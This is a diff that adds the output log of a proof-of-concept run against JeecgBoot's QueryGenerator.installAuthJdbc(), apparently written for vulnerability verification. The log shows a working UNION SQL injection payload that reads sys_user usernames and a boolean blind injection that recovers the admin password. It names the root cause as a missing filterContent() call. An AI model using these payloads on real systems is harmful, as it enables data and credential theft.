@@ -1,0 +1,61 @@
+======================================================================
+PoC 运行环境
+======================================================================
+操作系统: Linux
+JDK版本: OpenJDK 25.0.2
+H2版本: 2.2.224
+运行时间: 2026-05-23
+编译命令: javac -cp h2-2.2.224.jar PoC_VerifySQLi.java
+运行命令: java -cp .:h2-2.2.224.jar PoC_VerifySQLi
+
+======================================================================
+运行输出
+======================================================================
+
+======================================================================
+PoC: JeecgBoot QueryGenerator.installAuthJdbc() SQL注入验证
+======================================================================
+
+[正常场景] 无数据权限规则时的查询:
+SQL: select * from demo where 1=1
+---
+  行1: ID=d1 | NAME=正常数据A | AGE=25
+  行2: ID=d2 | NAME=正常数据B | AGE=30
+  共 2 行
+
+[攻击场景1] UNION注入 — 跨表窃取 sys_user 数据:
+恶意 ruleValue: 1=2 UNION SELECT id, username, id FROM sys_user WHERE 1=1 OR 1=1
+最终执行SQL: select * from demo where 1=1 and 1=2 UNION SELECT id, username, id FROM sys_user WHERE 1=1 OR 1=1
+---
+结果（注意: name 列现在返回的是 sys_user.username）:
+  行1: ID=1 | NAME=admin | AGE=1
+  行2: ID=2 | NAME=jeecg | AGE=2
+  行3: ID=3 | NAME=test_user | AGE=3
+  共 3 行
+
+[攻击场景2] 布尔盲注 — 逐字符猜解 admin 密码:
+目标: sys_user 表中 username='admin' 的 password 字段
+---
+开始猜解 (最多32位)...
+  位置 1: 'a' (命中)
+  位置 2: 'd' (命中)
+  位置 3: 'm' (命中)
+  位置 4: 'i' (命中)
+  位置 5: 'n' (命中)
+  位置 6: '1' (命中)
+  位置 7: '2' (命中)
+  位置 8: '3' (命中)
+猜解结果: admin123
+
+[对比] 如果有 SqlInjectionUtil.filterContent() 过滤:
+filterContent 会检测 ruleValue 中的 UNION/SELECT 等关键词
+检测到后抛出异常，阻止 SQL 执行。
+但 installAuthJdbc() 没有调用 filterContent()，所以注入成功。
+
+======================================================================
+验证结论:
+  1. UNION注入: 成功跨表读取 sys_user 全部用户名
+  2. 布尔盲注: 成功猜解 admin 密码为 "admin123"
+  3. 根因: installAuthJdbc() 第951行无 filterContent 过滤
+  4. 落地: JeecgDemoMapper.xml 使用 ${permissionSql} 字符串替换
+======================================================================
